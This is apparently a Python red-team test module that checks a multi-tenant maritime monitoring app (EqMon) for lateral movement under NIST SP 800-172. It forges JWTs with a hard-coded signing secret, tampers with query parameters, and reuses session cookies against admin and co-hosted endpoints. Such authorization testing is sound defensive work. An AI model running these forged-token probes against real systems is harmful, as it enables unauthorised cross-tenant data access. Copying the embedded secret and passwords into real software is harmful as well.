"""Lateral movement across security domain boundaries — NIST SP 800-172 Control 3.13.4e.

Tests whether a compromised account in one security domain (opco or vessel scope)
can reach resources in another domain, violating the principle of least privilege
and multi-tenant isolation. Covers:

  - Vessel-to-vessel lateral movement within an opco
  - Opco-to-opco lateral movement using crafted JWTs
  - Vessel-officer escalation into admin-only domain endpoints
  - API session cookie reuse against the admin web panel
  - Cross-service token reuse against unrelated service endpoints
  - Query-parameter injection overriding JWT domain scope claims

NIST SP 800-172 3.13.4e: "Implement security domains with separate execution
domains for processes operating at different privilege levels or with different
access controls, and prevent lateral movement between domains."
"""

import json
import time
import uuid

import jwt as pyjwt

from redteam.base import Attack, AttackResult, Severity, Status

JWT_SECRET = "eqmon_jwt_secret_2026_artemis_integration"

# Credentials matching the red-team user fixture set
_VESSEL_OFFICER_EMAIL = "redteam-vessel@example.com"
_VESSEL_OFFICER_PASSWORD = "RedTeamV3ssel2026!"

_COMPANY_ADMIN_EMAIL = "redteam-company@example.com"
_COMPANY_ADMIN_PASSWORD = "RedTeamC0mpany2026!"

# Fictitious but realistic tenant/vessel IDs used in crafted tokens
_OPCO_A = "opco-a"
_OPCO_B = "opco-b"
_VESSEL_B1 = "vessel-b1"
_VESSEL_B2 = "vessel-b2"
_VESSEL_X1 = "vessel-x1"


def _build_jwt(role: str, opco_id: str, vessel_id: str | None = None) -> str:
    """Craft a signed EqMon JWT with the given domain claims."""
    now = int(time.time())
    claims: dict = {
        "sub": str(uuid.uuid4()),
        "email": f"redteam-crafted-{role}@example.com",
        "role": role,
        "opco_id": opco_id,
        "iat": now,
        "exp": now + 3600,
    }
    if vessel_id:
        claims["vessel_id"] = vessel_id
    return pyjwt.encode(claims, JWT_SECRET, algorithm="HS256")


class LateralMovementAttack(Attack):
    name = "api.lateral_movement"
    category = "api"
    severity = Severity.CRITICAL
    description = (
        "NIST SP 800-172 3.13.4e — Verify that a compromised account cannot "
        "traverse domain boundaries (opco isolation, vessel isolation, "
        "admin domain separation) via JWT manipulation or parameter injection."
    )

    async def execute(self, client) -> list[AttackResult]:
        results: list[AttackResult] = []

        results.append(await self._vessel_to_other_vessel(client))
        results.append(await self._opco_to_other_opco(client))
        results.append(await self._vessel_to_admin_endpoints(client))
        results.append(await self._api_to_admin_panel(client))
        results.append(await self._cross_service_token_reuse(client))
        results.append(await self._parameter_injection_domain_escape(client))

        return results

    # ------------------------------------------------------------------
    # Variant 1: vessel-officer for vessel-b1 accessing vessel-b2 data
    # ------------------------------------------------------------------
    async def _vessel_to_other_vessel(self, client) -> AttackResult:
        token = _build_jwt(
            role="vessel-officer",
            opco_id=_OPCO_B,
            vessel_id=_VESSEL_B1,
        )
        crafted_cookies = {"eqmon_session": token}

        # Probe three plausible vessel-scoped endpoints
        probes = [
            f"/api/vessels.php?vessel_id={_VESSEL_B2}",
            f"/api/readings.php?vessel_id={_VESSEL_B2}",
            f"/api/equipment.php?vessel_id={_VESSEL_B2}",
        ]

        probe_results = []
        any_vulnerable = False
        for path in probes:
            status_code, body, _headers = await client.get(
                path, cookies=crafted_cookies
            )
            if status_code == 200:
                any_vulnerable = True
                probe_results.append(f"VULNERABLE {path} → {status_code}")
            elif status_code in (401, 403):
                probe_results.append(f"DEFENDED  {path} → {status_code}")
            else:
                probe_results.append(f"UNKNOWN   {path} → {status_code}")

        if any_vulnerable:
            final_status = Status.VULNERABLE
            detail = (
                "A vessel-officer JWT scoped to vessel-b1 received data for "
                "vessel-b2. Inter-vessel isolation is not enforced; a compromised "
                "vessel account can read data belonging to sibling vessels within "
                "the same opco."
            )
        else:
            final_status = Status.DEFENDED
            detail = (
                "All probes for vessel-b2 data returned 401/403 when the JWT "
                "is scoped to vessel-b1. Intra-opco vessel isolation is enforced."
            )

        return self._make_result(
            variant="vessel_to_other_vessel",
            status=final_status,
            evidence="\n".join(probe_results),
            details=detail,
            request={
                "jwt_vessel_id": _VESSEL_B1,
                "jwt_opco_id": _OPCO_B,
                "target_vessel_id": _VESSEL_B2,
                "probes": probes,
            },
            response={"probe_results": probe_results},
        )

    # ------------------------------------------------------------------
    # Variant 2: company-admin for opco-a accessing opco-b resources
    # ------------------------------------------------------------------
    async def _opco_to_other_opco(self, client) -> AttackResult:
        token = _build_jwt(role="company-admin", opco_id=_OPCO_A)
        crafted_cookies = {"eqmon_session": token}

        probes = [
            f"/api/companies.php?opco_id={_OPCO_B}",
            f"/api/vessels.php?opco_id={_OPCO_B}",
            f"/api/users.php?opco_id={_OPCO_B}",
        ]

        probe_results = []
        any_vulnerable = False
        for path in probes:
            status_code, body, _headers = await client.get(
                path, cookies=crafted_cookies
            )
            if status_code == 200:
                any_vulnerable = True
                probe_results.append(f"VULNERABLE {path} → {status_code}")
            elif status_code in (401, 403):
                probe_results.append(f"DEFENDED  {path} → {status_code}")
            else:
                probe_results.append(f"UNKNOWN   {path} → {status_code}")

        if any_vulnerable:
            final_status = Status.VULNERABLE
            detail = (
                "A company-admin JWT for opco-a successfully retrieved data "
                "belonging to opco-b. Cross-opco tenant isolation is broken; "
                "any company-admin can read (and potentially modify) another "
                "tenant's data by crafting a JWT with their own opco_id."
            )
        else:
            final_status = Status.DEFENDED
            detail = (
                "All opco-b probes returned 401/403 for a JWT scoped to opco-a. "
                "Cross-opco tenant isolation is enforced correctly."
            )

        return self._make_result(
            variant="opco_to_other_opco",
            status=final_status,
            evidence="\n".join(probe_results),
            details=detail,
            request={
                "jwt_opco_id": _OPCO_A,
                "target_opco_id": _OPCO_B,
                "probes": probes,
            },
            response={"probe_results": probe_results},
        )

    # ------------------------------------------------------------------
    # Variant 3: vessel-officer reaching admin-only endpoints
    # ------------------------------------------------------------------
    async def _vessel_to_admin_endpoints(self, client) -> AttackResult:
        token = _build_jwt(
            role="vessel-officer",
            opco_id=_OPCO_B,
            vessel_id=_VESSEL_B1,
        )
        crafted_cookies = {"eqmon_session": token}

        admin_endpoints = [
            ("/api/admin/users.php", "GET"),
            ("/api/admin/settings.php", "GET"),
            ("/api/admin/audit-log.php", "GET"),
            ("/api/admin/companies.php", "GET"),
        ]

        probe_results = []
        any_vulnerable = False
        all_defended = True
        for path, method in admin_endpoints:
            if method == "GET":
                status_code, body, _headers = await client.get(
                    path, cookies=crafted_cookies
                )
            else:
                status_code, body, _headers = await client.post(
                    path, json_body={}, cookies=crafted_cookies
                )

            if status_code == 200:
                any_vulnerable = True
                all_defended = False
                probe_results.append(f"VULNERABLE {path} → {status_code}")
            elif status_code in (401, 403):
                probe_results.append(f"DEFENDED  {path} → {status_code}")
            else:
                all_defended = False
                probe_results.append(f"UNKNOWN   {path} → {status_code}")

        if any_vulnerable:
            final_status = Status.VULNERABLE
            detail = (
                "A vessel-officer JWT gained access to admin-domain endpoints. "
                "This represents lateral movement into a higher-privilege domain; "
                "role-based access control on admin routes is not enforced."
            )
        elif all_defended:
            final_status = Status.DEFENDED
            detail = (
                "All admin endpoints returned 401/403 for a vessel-officer JWT. "
                "The admin domain boundary is correctly enforced."
            )
        else:
            final_status = Status.PARTIAL
            detail = "Mixed responses across admin endpoints for vessel-officer JWT."

        return self._make_result(
            variant="vessel_to_admin_endpoints",
            status=final_status,
            evidence="\n".join(probe_results),
            details=detail,
            request={
                "jwt_role": "vessel-officer",
                "jwt_vessel_id": _VESSEL_B1,
                "endpoints_tested": len(admin_endpoints),
            },
            response={"probe_results": probe_results},
        )

    # ------------------------------------------------------------------
    # Variant 4: API auth cookie reused against the admin web panel
    # ------------------------------------------------------------------
    async def _api_to_admin_panel(self, client) -> AttackResult:
        # Obtain a legitimate session by logging in as a vessel-officer
        login_ok = await client.login(
            _VESSEL_OFFICER_EMAIL, _VESSEL_OFFICER_PASSWORD
        )

        api_cookies: dict = {}
        auth_source = "login"

        if not login_ok:
            # Fall back to a crafted JWT so we still probe the panel
            token = _build_jwt(
                role="vessel-officer",
                opco_id=_OPCO_B,
                vessel_id=_VESSEL_B1,
            )
            api_cookies = {"eqmon_session": token}
            auth_source = "crafted_jwt"
        else:
            api_cookies = dict(client._cookies)

        status_code, body, headers = await client.get(
            "/admin/index.php", cookies=api_cookies
        )

        # Detect successful admin panel access: 200 with recognisable admin content
        admin_keywords = ["admin", "dashboard", "management", "logout", "user list"]
        body_lower = body.lower() if isinstance(body, str) else ""
        content_match = any(kw in body_lower for kw in admin_keywords)

        if status_code == 200 and content_match:
            final_status = Status.VULNERABLE
            detail = (
                "An API session cookie (role: vessel-officer) was accepted by the "
                "admin web panel at /admin/index.php and returned admin content. "
                "The admin panel does not enforce a separate authentication domain; "
                "any valid API token grants access to the web admin interface."
            )
        elif status_code == 200 and not content_match:
            final_status = Status.PARTIAL
            detail = (
                "Admin panel returned 200 but body did not contain recognisable "
                "admin content. May be a login redirect page rendered as 200, or "
                "a partial content leak. Manual review recommended."
            )
        elif status_code in (301, 302, 303, 307, 308):
            location = headers.get("location", headers.get("Location", "unknown"))
            final_status = Status.DEFENDED
            detail = (
                f"Admin panel redirected to {location!r} (HTTP {status_code}). "
                "The panel requires separate authentication and does not accept "
                "API session cookies."
            )
        elif status_code in (401, 403):
            final_status = Status.DEFENDED
            detail = (
                f"Admin panel returned {status_code}. The admin domain boundary "
                "is enforced; API cookies are rejected."
            )
        else:
            final_status = Status.PARTIAL
            detail = (
                f"Admin panel returned unexpected status {status_code}. "
                "Unable to determine whether the domain boundary is enforced."
            )

        return self._make_result(
            variant="api_to_admin_panel",
            status=final_status,
            evidence=(
                f"Auth source: {auth_source}, "
                f"Status: {status_code}, "
                f"Admin content detected: {content_match}, "
                f"Body snippet: {body[:300]}"
            ),
            details=detail,
            request={
                "path": "/admin/index.php",
                "auth_source": auth_source,
                "cookie_key": "eqmon_session",
            },
            response={
                "status": status_code,
                "admin_content_match": content_match,
                "body_snippet": body[:300] if isinstance(body, str) else str(body)[:300],
            },
        )

    # ------------------------------------------------------------------
    # Variant 5: EqMon JWT reused against other services on the same host
    # ------------------------------------------------------------------
    async def _cross_service_token_reuse(self, client) -> AttackResult:
        token = _build_jwt(role="vessel-officer", opco_id=_OPCO_B, vessel_id=_VESSEL_B1)
        crafted_cookies = {"eqmon_session": token}

        # Endpoints that would belong to other services co-hosted on Artemis
        other_service_probes = [
            "/api/system-status.php",
            "/api/health.php",
            "/api/metrics.php",
            "/api/internal/config.php",
        ]

        probe_results = []
        any_vulnerable = False
        for path in other_service_probes:
            status_code, body, _headers = await client.get(
                path, cookies=crafted_cookies
            )
            # A 200 response from an endpoint outside EqMon's own API scope
            # while presenting an EqMon JWT indicates token reuse across services.
            if status_code == 200:
                any_vulnerable = True
                probe_results.append(f"VULNERABLE {path} → {status_code}")
            elif status_code in (401, 403, 404):
                probe_results.append(f"REJECTED  {path} → {status_code}")
            else:
                probe_results.append(f"UNKNOWN   {path} → {status_code}")

        if any_vulnerable:
            final_status = Status.VULNERABLE
            detail = (
                "The EqMon JWT was accepted by one or more endpoints outside the "
                "application's own API boundary. Cross-service token reuse is "
                "possible; a compromised EqMon token provides lateral movement "
                "into co-hosted services."
            )
        else:
            final_status = Status.DEFENDED
            detail = (
                "All probed external/system endpoints rejected or did not respond "
                "to the EqMon JWT. Cross-service token reuse was not demonstrated."
            )

        return self._make_result(
            variant="cross_service_token_reuse",
            status=final_status,
            evidence="\n".join(probe_results),
            details=detail,
            request={
                "jwt_role": "vessel-officer",
                "jwt_opco_id": _OPCO_B,
                "probes": other_service_probes,
            },
            response={"probe_results": probe_results},
        )

    # ------------------------------------------------------------------
    # Variant 6: query-parameter injection overriding JWT domain scope
    # ------------------------------------------------------------------
    async def _parameter_injection_domain_escape(self, client) -> AttackResult:
        # JWT is correctly scoped to opco-a; params attempt to access opco-b / vessel-x1
        token = _build_jwt(role="company-admin", opco_id=_OPCO_A)
        crafted_cookies = {"eqmon_session": token}

        injection_probes = [
            (
                "/api/vessels.php",
                {"opco_id": _OPCO_B, "vessel_id": _VESSEL_X1},
                "vessels listing for opco-b/vessel-x1",
            ),
            (
                "/api/companies.php",
                {"opco_id": _OPCO_B},
                "company data for opco-b",
            ),
            (
                "/api/users.php",
                {"opco_id": _OPCO_B, "vessel_id": _VESSEL_X1},
                "users for opco-b/vessel-x1",
            ),
            (
                "/api/readings.php",
                {"opco_id": _OPCO_B, "vessel_id": _VESSEL_X1},
                "sensor readings for opco-b/vessel-x1",
            ),
        ]

        probe_results = []
        any_vulnerable = False
        all_defended = True
        for path, params, label in injection_probes:
            # Build query string manually to ensure params are sent
            qs = "&".join(f"{k}={v}" for k, v in params.items())
            full_path = f"{path}?{qs}"
            status_code, body, _headers = await client.get(
                full_path, cookies=crafted_cookies
            )

            if status_code == 200:
                any_vulnerable = True
                all_defended = False
                probe_results.append(
                    f"VULNERABLE {label} ({full_path}) → {status_code}"
                )
            elif status_code in (401, 403):
                probe_results.append(
                    f"DEFENDED  {label} ({full_path}) → {status_code}"
                )
            else:
                all_defended = False
                probe_results.append(
                    f"UNKNOWN   {label} ({full_path}) → {status_code}"
                )

        if any_vulnerable:
            final_status = Status.VULNERABLE
            detail = (
                "Query parameters opco_id/vessel_id overrode the JWT's own domain "
                "claims. The server is resolving tenant scope from user-controlled "
                "query parameters rather than (or in addition to) the signed JWT. "
                "An attacker can escape their opco/vessel boundary without forging "
                "a token simply by appending query parameters."
            )
        elif all_defended:
            final_status = Status.DEFENDED
            detail = (
                "All injected opco_id/vessel_id query parameters were rejected; "
                "the server correctly uses JWT claims as the authoritative source "
                "of tenant scope and ignores conflicting query parameters."
            )
        else:
            final_status = Status.PARTIAL
            detail = "Mixed results across parameter injection probes."

        return self._make_result(
            variant="parameter_injection_domain_escape",
            status=final_status,
            evidence="\n".join(probe_results),
            details=detail,
            request={
                "jwt_opco_id": _OPCO_A,
                "injected_opco_id": _OPCO_B,
                "injected_vessel_id": _VESSEL_X1,
                "probes_count": len(injection_probes),
            },
            response={"probe_results": probe_results},
        )
